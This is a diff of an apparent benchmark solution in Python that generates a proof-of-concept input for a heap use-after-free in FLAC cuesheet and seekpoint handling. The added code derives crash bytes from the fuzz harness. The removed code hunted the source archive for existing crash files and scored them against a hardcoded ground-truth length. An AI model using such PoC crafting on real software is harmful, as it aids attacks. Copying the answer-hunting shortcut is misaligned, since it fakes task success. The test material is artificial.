@@ -1,237 +1,220 @@
 import os
 import tarfile
-import zipfile
-import io
+import tempfile
+import re
 
 
 class Solution:
-    def __init__(self):
-        self.ground_truth_len = 159
-        self.best_data = None
-        self.best_score = float('-inf')
-        self.max_file_size = 1024 * 1024  # 1 MiB
-        self.max_nested_archive_size = 5 * 1024 * 1024  # 5 MiB
-        self.max_nested_depth = 2
-        self.interesting_substrings = (
-            'poc',
-            'crash',
-            'uaf',
-            'use-after',
-            'use_after',
-            'bug',
-            'testcase',
-            'oss-fuzz',
-            'clusterfuzz',
-            'queue',
-            'crashes',
-            'id_',
-            'cue',
-            'cuesheet',
-            'metaflac',
-            'flac',
-            '61292',
-        )
+    def _safe_extract(self, tar, path):
+        base = os.path.realpath(path)
+        for member in tar.getmembers():
+            member_path = os.path.realpath(os.path.join(path, member.name))
+            if not member_path.startswith(base + os.sep) and member_path != base:
+                continue
+            tar.extract(member, path)
+
+    def _find_harness_text(self, root_dir):
+        harness_candidates = []
+        for root, _, files in os.walk(root_dir):
+            for name in files:
+                if not name.endswith((".c", ".cc", ".cpp", ".cxx", ".C", ".CPP")):
+                    continue
+                path = os.path.join(root, name)
+                try:
+                    with open(path, "r", errors="ignore") as f:
+                        text = f.read()
+                except Exception:
+                    continue
+                lower = text.lower()
+                score = 0
+                if "llvmfuzzertestoneinput" in lower:
+                    score += 10
+                if "fuzz" in lower:
+                    score += 3
+                if "cuesheet" in lower:
+                    score += 5
+                if "seek" in lower:
+                    score += 2
+                if score > 0:
+                    harness_candidates.append((score, path, text))
+        if not harness_candidates:
+            return None
+        harness_candidates.sort(key=lambda x: -x[0])
+        return harness_candidates[0][2]
+
+    def _extract_switch_body(self, text, start_index):
+        brace_index = text.find("{", start_index)
+        if brace_index == -1:
+            return ""
+        depth = 1
+        i = brace_index + 1
+        n = len(text)
+        while i < n and depth > 0:
+            ch = text[i]
+            if ch == "{":
+                depth += 1
+            elif ch == "}":
+                depth -= 1
+            i += 1
+        if depth != 0:
+            return ""
+        return text[brace_index + 1 : i - 1]
+
+    def _find_ops_in_text(self, text):
+        # Try to locate a switch that dispatches on operations derived from data bytes.
+        for sw in re.finditer(r"switch\s*\(\s*([^\)]+)\)", text):
+            switch_expr = sw.group(1).strip()
+            body = self._extract_switch_body(text, sw.end())
+            if not body:
+                continue
+
+            mod = None
+
+            # Case 1: switch(data[idx] % N)
+            m_direct = re.search(
+                r"(?:data|Data)\s*\[\s*([^\]]+)\s*\]\s*%\s*(\d+)", switch_expr
+            )
+            if m_direct:
+                try:
+                    mod = int(m_direct.group(2))
+                except Exception:
+                    mod = None
+            else:
+                # Case 2: switch(var); var = data[idx] % N;
+                varname_match = re.match(r"([A-Za-z_][A-Za-z0-9_]*)$", switch_expr)
+                if varname_match:
+                    varname = varname_match.group(1)
+                    pre_region = text[max(0, sw.start() - 500) : sw.start()]
+                    assign_re = re.compile(
+                        r"%s\s*=\s*([^;]+);" % re.escape(varname)
+                    )
+                    for am in assign_re.finditer(pre_region):
+                        rhs = am.group(1)
+                        mm = re.search(
+                            r"(?:data|Data)\s*\[\s*([^\]]+)\s*\]\s*%\s*(\d+)", rhs
+                        )
+                        if mm:
+                            try:
+                                mod = int(mm.group(2))
+                            except Exception:
+                                mod = None
+                            break
+
+            if not mod or mod <= 0:
+                continue
+
+            # Parse cases to find cuesheet and seek-related operations.
+            cases = list(re.finditer(r"case\s+(\d+)\s*:", body))
+            if not cases:
+                continue
+
+            import_case = None
+            append_case = None
+
+            for i, cm in enumerate(cases):
+                try:
+                    val = int(cm.group(1))
+                except Exception:
+                    continue
+                block_start = cm.end()
+                block_end = cases[i + 1].start() if i + 1 < len(cases) else len(body)
+                blk = body[block_start:block_end].lower()
+                if import_case is None and "cuesheet" in blk:
+                    import_case = val
+                if append_case is None and ("seek" in blk or "seekpoint" in blk):
+                    append_case = val
+
+            if import_case is not None and append_case is not None:
+                return mod, append_case, import_case
+
+        return None
+
+    def _build_poc_from_harness(self, text):
+        # Determine minimal size requirement from conditions like "if (Size < N)".
+        size_thresholds = []
+        for m in re.finditer(r"\bSize\s*<\s*(\d+)", text):
+            try:
+                size_thresholds.append(int(m.group(1)))
+            except Exception:
+                pass
+        for m in re.finditer(r"\bSize\s*<=\s*(\d+)", text):
+            try:
+                size_thresholds.append(int(m.group(1)) - 1)
+            except Exception:
+                pass
+        min_size = max(size_thresholds) + 1 if size_thresholds else 1
+
+        # Find maximum constant index into data/Data array.
+        index_consts = []
+        for m in re.finditer(r"\b(?:data|Data)\s*\[\s*(\d+)\s*\]", text):
+            try:
+                index_consts.append(int(m.group(1)))
+            except Exception:
+                pass
+
+        length = max(min_size, (max(index_consts) + 1) if index_consts else 1)
+        # Ensure enough bytes for several operations
+        if length < 32:
+            length = 32
+
+        poc = bytearray(length)
+        # Default fill: small non-zero values to avoid edge cases like division by zero
+        for i in range(length):
+            poc[i] = 1
+
+        ops_info = self._find_ops_in_text(text)
+        if ops_info:
+            mod, append_case, import_case = ops_info
+            # Values that will select given cases via "byte % mod"
+            append_val = append_case % 256
+            import_val = import_case % 256
+            # Avoid 0 if possible, just in case 0 has special meaning elsewhere
+            if append_val == 0 and mod > 1:
+                append_val = (append_val + mod) % 256
+            if import_val == 0 and mod > 1:
+                import_val = (import_val + mod) % 256
+
+            # Fill the entire buffer with alternating append/import pattern
+            pattern = [append_val, import_val]
+            for i in range(length):
+                poc[i] = pattern[i % len(pattern)]
+
+        return bytes(poc)
+
+    def _generic_cuesheet(self):
+        # Fallback textual cuesheet; moderately small but exercises tracks and indices.
+        lines = [
+            'REM GENRE "Test"',
+            "REM DATE 2025",
+            'PERFORMER "PoCTest"',
+            'TITLE "Heap UAF Trigger"',
+            'FILE "test.flac" WAVE',
+        ]
+        # A handful of tracks with multiple indices to exercise cuesheet/seekpoint paths
+        for t in range(1, 8):
+            lines.append("  TRACK %02d AUDIO" % t)
+            # Two indices per track (00 and 01)
+            minute = (t - 1) // 2
+            second = ((t - 1) * 10) % 60
+            lines.append("    INDEX 00 %02d:%02d:%02d" % (minute, second, 0))
+            lines.append("    INDEX 01 %02d:%02d:%02d" % (minute, (second + 2) % 60, 0))
+        data = "\n".join(lines) + "\n"
+        return data.encode("ascii", errors="ignore")
 
     def solve(self, src_path: str) -> bytes:
+        tmpdir = tempfile.mkdtemp(prefix="poc61292_")
         try:
-            if tarfile.is_tarfile(src_path):
-                with tarfile.open(src_path, 'r:*') as tar:
-                    self._scan_tar(tar, prefix='', depth=0)
+            with tarfile.open(src_path, "r:*") as tar:
+                self._safe_extract(tar, tmpdir)
         except Exception:
-            pass
+            # If extraction fails, just return a generic cuesheet
+            return self._generic_cuesheet()
 
-        if self.best_data is not None:
-            return self.best_data
-
-        return self._fallback_poc()
-
-    def _is_interesting_name(self, name_low: str) -> bool:
-        for s in self.interesting_substrings:
-            if s in name_low:
-                return True
-        return False
-
-    def _scan_tar(self, tar: tarfile.TarFile, prefix: str, depth: int) -> None:
-        for member in tar.getmembers():
-            if not member.isfile():
-                continue
-
-            name_full = prefix + member.name
-            name_low = name_full.lower()
-            size = member.size
-
-            if size <= 0:
-                continue
-
-            is_archive_name = name_low.endswith(
-                ('.tar', '.tar.gz', '.tgz', '.tar.bz2', '.tar.xz', '.txz', '.zip')
-            )
-            should_try_nested = (
-                depth < self.max_nested_depth
-                and is_archive_name
-                and size <= self.max_nested_archive_size
-            )
-            should_read_for_candidate = (
-                size <= self.max_file_size or self._is_interesting_name(name_low)
-            )
-
-            if not (should_read_for_candidate or should_try_nested):
-                continue
-
+        harness_text = self._find_harness_text(tmpdir)
+        if harness_text:
             try:
-                f = tar.extractfile(member)
-                if f is None:
-                    continue
-                data = f.read()
+                return self._build_poc_from_harness(harness_text)
             except Exception:
-                continue
-
-            if should_read_for_candidate:
-                self._score_candidate(name_full, size, data)
-
-            if should_try_nested:
-                self._maybe_scan_nested_archive(name_full, name_low, data, depth + 1)
-
-    def _scan_zip(self, zf: zipfile.ZipFile, prefix: str, depth: int) -> None:
-        for info in zf.infolist():
-            if info.is_dir():
-                continue
-
-            name_full = prefix + info.filename
-            name_low = name_full.lower()
-            size = info.file_size
-
-            if size <= 0:
-                continue
-
-            is_archive_name = name_low.endswith(
-                ('.tar', '.tar.gz', '.tgz', '.tar.bz2', '.tar.xz', '.txz', '.zip')
-            )
-            should_try_nested = (
-                depth < self.max_nested_depth
-                and is_archive_name
-                and size <= self.max_nested_archive_size
-            )
-            should_read_for_candidate = (
-                size <= self.max_file_size or self._is_interesting_name(name_low)
-            )
-
-            if not (should_read_for_candidate or should_try_nested):
-                continue
-
-            try:
-                data = zf.read(info.filename)
-            except Exception:
-                continue
-
-            if should_read_for_candidate:
-                self._score_candidate(name_full, size, data)
-
-            if should_try_nested:
-                self._maybe_scan_nested_archive(name_full, name_low, data, depth + 1)
-
-    def _maybe_scan_nested_archive(self, name_full: str, name_low: str, data: bytes, depth: int) -> None:
-        bio = io.BytesIO(data)
-        if name_low.endswith('.zip'):
-            try:
-                with zipfile.ZipFile(bio, 'r') as zf:
-                    self._scan_zip(zf, prefix=name_full + '::', depth=depth)
-            except Exception:
-                return
+                return self._generic_cuesheet()
         else:
-            try:
-                with tarfile.open(fileobj=bio, mode='r:*') as ntar:
-                    self._scan_tar(ntar, prefix=name_full + '::', depth=depth)
-            except Exception:
-                return
-
-    def _score_candidate(self, name: str, size: int, data: bytes) -> None:
-        name_low = name.lower()
-        score = 0.0
-
-        # Prefer smaller files
-        score -= size / 1000.0
-
-        # Name-based boosts
-        if 'poc' in name_low:
-            score += 100.0
-        if 'crash' in name_low:
-            score += 80.0
-        if 'uaf' in name_low or 'use-after' in name_low or 'use_after' in name_low:
-            score += 80.0
-        if 'heap' in name_low:
-            score += 20.0
-        if '61292' in name_low:
-            score += 80.0
-        if 'cue' in name_low or 'cuesheet' in name_low:
-            score += 60.0
-        if 'metaflac' in name_low or 'flac' in name_low:
-            score += 30.0
-        if 'oss-fuzz' in name_low or 'clusterfuzz' in name_low:
-            score += 40.0
-        if 'id_' in name_low:
-            score += 10.0
-        if 'queue' in name_low:
-            score += 5.0
-        if 'crashes' in name_low or '/crash' in name_low:
-            score += 30.0
-
-        # Extension-specific adjustments
-        if name_low.endswith('.cue'):
-            score += 100.0
-        elif name_low.endswith(('.flac', '.oga', '.ogg', '.wav', '.bin', '.raw')):
-            score += 20.0
-        elif name_low.endswith(('.txt', '.log')):
-            score += 5.0
-
-        # Penalize obvious source code files
-        if name_low.endswith(('.c', '.h', '.cc', '.cpp', '.cxx', '.java', '.py')):
-            score -= 100.0
-
-        # Content-based heuristics
-        if not data:
-            data = b''
-
-        if data:
-            ascii_chars = 0
-            for b in data:
-                if 32 <= b <= 126 or b in (9, 10, 13):
-                    ascii_chars += 1
-            if ascii_chars / float(len(data)) > 0.7:
-                text = data.decode('latin1', errors='ignore').upper()
-                if 'TRACK ' in text:
-                    score += 20.0
-                if 'INDEX ' in text:
-                    score += 20.0
-                if 'FILE ' in text:
-                    score += 10.0
-                if 'CUE' in text:
-                    score += 10.0
-                if 'CUESHEET' in text:
-                    score += 10.0
-
-        # Length closeness to ground-truth PoC
-        if size == self.ground_truth_len:
-            score += 200.0
-        else:
-            diff = abs(size - self.ground_truth_len)
-            if diff <= 10:
-                score += 50.0
-            elif diff <= 30:
-                score += 20.0
-
-        if score > self.best_score:
-            self.best_score = score
-            self.best_data = data
-
-    def _fallback_poc(self) -> bytes:
-        cue_text = (
-            'REM GENRE "TEST"\n'
-            'PERFORMER "X"\n'
-            'TITLE "Y"\n'
-            'FILE "test.wav" WAVE\n'
-            '  TRACK 01 AUDIO\n'
-            '    TITLE "T"\n'
-            '    INDEX 01 00:00:00\n'
-        )
-        return cue_text.encode('ascii', errors='ignore')
+            return self._generic_cuesheet()
